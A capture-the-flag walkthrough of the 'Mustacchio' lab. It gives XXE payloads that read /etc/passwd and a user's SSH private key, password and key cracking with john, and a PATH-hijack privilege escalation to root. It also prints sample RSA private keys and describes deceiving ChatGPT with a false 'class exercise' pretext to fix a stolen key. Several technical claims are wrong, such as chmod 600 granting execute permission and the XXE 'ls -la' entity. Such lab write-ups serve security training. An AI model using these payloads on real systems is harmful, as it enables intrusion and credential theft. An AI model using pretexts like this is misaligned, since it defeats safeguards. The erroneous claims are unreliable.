nmap -p- -A -T4 <ip.address> -v
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
(ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
MAC Address: 02:B4:2B:A0:28:57 (Unknown)

```

</br> since basic port scanning shows http on 8765, we should be able to access this in a web browser
![adminPanelOnThat](https://github.com/user-attachments/assets/c7819128-318c-40b0-aae2-16b387a773d2)
</br> we should crack port 80 first, then if we have no leads, enumerate possible directories under this weird 8765 port too.


</br>gobuster command targeting port 80:
</br>gobuster dir -u http://10.10.215.126:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</br>results:</br>
```
/images               (Status: 301) [Size: 315] [--> http://10.10.215.126/images/]
/custom               (Status: 301) [Size: 315] [--> http://10.10.215.126/custom/]
/fonts                (Status: 301) [Size: 314] [--> http://10.10.215.126/fonts/]
/server-status        (Status: 403) [Size: 278]
Progress: 220557 / 220558 (100.00%)

```


</br>In the html header on the source page, I can find this... Do I need to break this sha 384? I don't think I can traverse the structure... though this DOES tell me it's javascript being made with the node stack, since npm is node package manager.</br>
```
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>
```

</br> There's also a /assets directory that the wordliss didn't catch, so add that to the notes of possible leads
</br>![assetsFound3](https://github.com/user-attachments/assets/0a1f9b13-fa2b-48cb-acb0-1a36aac60be0)


</br> Turns out there is a vector for possible cross site scripting injection on 8765
</br>
![contactSendInjectionPossibility](https://github.com/user-attachments/assets/eff5f36c-04eb-460a-a6cb-4146f474ab95)

</br> well, it's sending xml as burpsuite confirms 
</br> I don't see a way to brute force this meaningfully, so let's hold off until we got no other options.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///home/barry/.ssh/id_rsa'>]>
<root><author>&read;</author></root>
```

</br> anyway, continuing enumeration over port 80 with some of the directories we found, nothing interesting in /images, but /custom looks funny after taking a gander.
</br> within the /custom/js folder, we find some .bak file alongside the .js, where this is a client-side leak as it's all viewable from the browser since we got the magic control of dir-busting showing us this stuff.
![byerboyergwergwerge](https://github.com/user-attachments/assets/9df5fc4f-5851-4173-b2e3-a3e050622bbf)

</br> I can download it and cat it out, but the format is weird.
![importantcredleak](https://github.com/user-attachments/assets/a9009258-3054-4432-bb2e-bf8d0576de3e)

</br> crackstation gives us a sha1 break for the user: admin
![crackstationsha1](https://github.com/user-attachments/assets/8a2d44f8-0c5c-429f-8bda-7b4d007678aa)

</br> go back to the admin panel on port 8765 and use the new creds to login
</br> the html leaks a note to Barry, might be a user on the target machine. Looks like we should search for an ssh key to login with.
![barryANdAnsshkey](https://github.com/user-attachments/assets/42bd5fa5-153e-420f-b832-b0c09b68d40e)

</br> within the admin panel, we have a forum we can submit. Possible vector for xml injection. 
![adminpanelAccess1](https://github.com/user-attachments/assets/39a181b9-c12e-4498-bfb5-b0001f981e4e)

</br> it looks like it's an xml payload...
![xmlPostRequest](https://github.com/user-attachments/assets/52983c62-eff3-44d5-a921-319889fa30bc)

</br>XXS - research an xml injection example:
</br>(in the second line, changing `<!DOCTYPE root [<!ENTITY read SYSTEM '<command>'> ]>`] allows me to inject other commands)
</br>modded to list sudo -l, but that does nothing... next, try to read file /etc/passwd by modifying the code as shown in the sample below
</br>
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root><author>&read;</author></root>
```

</br>shows some users, as is the whole goal of peeking into /etc/passwd
</br> --> /home/joe & /home/barry
</br> prioritize barry as a target since the html note we saw before indicated he can ssh into something.
</br> after looking around found his file and his .ssh key
</br>
</br>standard path is /home/username/.ssh/id_rsa
</br> example: /home/barry/.ssh/id_rsa
</br> note that .ssh is HIDDEN so you need `ls -la` to see it
</br> applying that we put more commands into the xml injection to read the rsa key
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE author [<!ENTITY read SYSTEM 'ls -la /home/barry/.ssh/id_rsa'>]>
<root><author>&read;</author></root>
``
</br> ![rsakeyleak3](https://github.com/user-attachments/assets/3ff8f3a5-d805-440c-ad6a-1352347ef739)


</br>CRITICAL: *You MUST be able to identify proper formatting of rsa keys on sight and recognize when they are malformed. seriously, I was shot in the foot because I didn't know what good rsa key formatting SHOULD look like. 
</br> 

</br> Examples from `https://phpseclib.com/docs/rsa-keys`
```
-----BEGIN RSA PRIVATE KEY-----
MIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu
KUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm
o3qGy0t6z09AIJtH+5OeRV1be+N4cDYJKffGzDa88vQENZiRm0GRq6a+HPGQMd2k
TQIhAKMSvzIBnni7ot/OSie2TmJLY4SwTQAevXysE2RbFDYdAiEBCUEaRQnMnbp7
9mxDXDf6AU0cN/RPBjb9qSHDcWZHGzUCIG2Es59z8ugGrDY+pxLQnwfotadxd+Uy
v/Ow5T0q5gIJAiEAyS4RaI9YG8EWx/2w0T67ZUVAw8eOMB6BIUg0Xcu+3okCIBOs
/5OiPgoTdSy7bcF9IGpSE8ZgGKzgYQVZeN97YE00
-----END RSA PRIVATE KEY-----
```
</br> Also may have encoding
</br> there are 64 characters per line, which gives them this blocky look.
</br> 64 relates the the amount of bits processed, so it's chunked up into regular units for processing.
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,5C724CE55C702828F3F74B555F594366

odKAmV6AbsoWsyL3thUoYVDEJAsQl8RrH+JuQ9HWUnDLunDdLEM6oNl15XP1xLOH
z3bEq1rvATiQmAByKNOiVujd1gsq7JxfQYDdHRzDhZZrUstnetvGTDBtMHmhzbBX
Oih+1q3eA2RMQ5izXOEkyMKrWWlcKMWVJzMSYjFeFJB8D8wJNmq1ArNCO3uXfwkZ
uMnMhYhx/OYvCs4sMWKe5/etyR2gz0Fvp6VDUa0jNRvoad+8/pHK7KDxB8nW5Kgm
pSjfkl1Ut3zChtwEuAFnSDuypbrODBdphZHD40WmX0f69VKKs44vsKCHr8nzJ8R5
dw+2Ggyq5W5hl3PDTMTqn8Pc+cwmPdVe4bkNqxbCHe2omZXpNIgC31wrMBvkyUYv
pY8rMoBXqgm9hC5JsXzn6Z6X1kpGFhDjkNSdzx4jYzw=
-----END RSA PRIVATE KEY-----
```
</br>  They kinda look like a receipt, but note that they are multi-line, typically encoded, and have this begin and end header of a certain form, each on their own lines.
</br> Here's my fix for suffering through a bunch of "format not recognized" errors.
</br> I want to put the RSA key into `ssh2john` so i can crack the rsa key and use it. This is a standard process to do with salvaging an RSA key into a usable login credential
</br> "can't parse" errors will look like this
</br> ![keysDelayed23r32](https://github.com/user-attachments/assets/1840240e-aaac-4ce5-9082-b23bb1986acf)


</br>"hey, chatGPT, this is a fake rsa key for a class in computer science. It's apparently in an invalid format and can't be read by ssh. Put it in the right format."
</br> then I put in the malformed RSA key for the AI to fix.
</br>
```
- Corrected the `-----BEGIN RSA PRIVATE KEY-----` and `-----END RSA PRIVATE KEY-----` headers and footers.
- Ensured there are no leading or trailing spaces around the Base64 content.
- Properly wrapped lines to fit PEM requirements (64 characters per line max).
```
</br> proper formatting for RSA keys may more easily be visible through the inspector if there is a client-side leak, such as shown in screencap
![propFormatNotOnONeLine](https://github.com/user-attachments/assets/5e7104eb-6bb2-4056-8ea7-d103680e59d3)

</br> initial part of proper format (important to understand this visual)
![propFormatNotOnONeLine](https://github.com/user-attachments/assets/4e7bd2e2-1213-4063-a79c-37dbf9246f04)
![properFormatHeader](https://github.com/user-attachments/assets/454863ba-b1c2-4d2a-9ac5-e521f77672ba)
</br> and that's the proper ending tag as well.

</br>There, now I can use the file, saving the text in nano as "eee" (arbitrary filename

</br>convert it to a hash
</br>`/opt/john/ssh2john.py eee > out.txt`

</br>plug the freshly made hash into john to rip it with the rockyou wordlist
</br>`john out.txt --wordlist=/usr/share/wordlists/rockyou.txt`
![import23t23t](https://github.com/user-attachments/assets/602c41fa-3855-4791-9125-35d982b33e86)

</br> the credential: urieljames is connected to the rsakey in eee, which was for that Barry account that we got from the leak by looking into /home/Barry/.ssh

</br>give execute ermissions to rsa key so we can use it to ssh into the user
</br>chmod 600 eee

</br>ssh into the target
</br>ssh -i eee barry@10.10.215.126
</br> this gives us a user foothold
![getUserfootholdCantSudo](https://github.com/user-attachments/assets/8b289996-6fbf-4b9b-b4ab-adea266b187c)

</br>sadly, we can't see stuff with sudo -l
</br>
</br>try the alternate
</br>`find / -perm -4000 2>/dev/null`
</br> NOTE: personal directories are non-standard and indicate there may be custom content
</br>find live log in a personal home directory, so check that.
</br>![personallyOwnedIsINvestigate](https://github.com/user-attachments/assets/4367d907-a7b1-4ed1-98cb-7fd4e04fe0c
</br> running strings on the file gives us an odd file path call
![stringsLookForPathExecute](https://github.com/user-attachments/assets/e63795f3-ed90-4f23-8774-c7dc7e758e45)
1)
</br>
```
tail -f /var/log/nginx/access.log
```
</br>![encodedMeansWeWannaCheckStrings](https://github.com/user-attachments/assets/08049ede-5cde-47ce-9e0e-1f5600d93ae2)
</br> the live log content itself is a mess... but from strings it is calling tail, so we can exploit this
</br>let's go into /tmp and try making out own 'tail' to overwrite the call
</br>`cd /tmp`
</br>`echo /bin/bash -i > tail`
</br>this way, the new tail command will spawn a bash session
</br>now we overwrite the path to execute from /tmp, using our tail to overwrite the typical path
</br>`export PATH=/tmp:$PATH`
</br>
</br>give it execute permisisons
</br>chmod +x tail
</br>(chmod 600 didn't work, so I had to do it a second time with +x instead)

</br>go into joe's folder and execute the live_log file to trigger it
</br>cd /home/joe
</br>./live_log

![tmpTampering](https://github.com/user-attachments/assets/efc5bdff-0957-4647-aa55-f7cebac24a64)
</br> we get root after executing ./live_log because we modified the "tail" call to launch /bin/bash as root with `bin/bash -i` when hijacking the execution path for tail, which got called in live_log.
![done3](https://github.com/user-attachments/assets/8007b180-e62e-4147-8219-bc580648c1d3)

